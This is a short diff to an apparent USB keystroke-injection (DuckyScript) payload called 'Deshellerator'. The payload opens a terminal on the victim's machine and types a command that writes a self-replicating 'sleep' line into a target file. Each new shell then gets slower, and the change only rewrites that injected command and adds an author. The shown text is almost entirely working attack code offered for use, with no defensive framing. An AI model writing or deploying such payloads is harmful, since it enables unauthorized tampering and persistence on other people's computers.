@@ -1,5 +1,5 @@
 REM TITLE: Deshellerator
-REM AUTHOR: Korben
+REM AUTHOR: Korben, Darren
 REM VERSION: 1.0
 
 REM DESCRIPTION: "Slow down there buckaroo" - Shell Decelerator
@@ -64,5 +64,5 @@ END_IF
 
 CTRL ALT t
 DELAY #UI_DELAY
-STRINGLN echo "sleep #DECELERATION_RATE;echo 'sleep #DECELERATION_RATE'>>#TARGET_FILE">>#TARGET_FILE;exit
+STRINGLN echo "echo 'sleep #DECELERATION_RATE'>>#TARGET_FILE">>#TARGET_FILE;exit
 LED_G
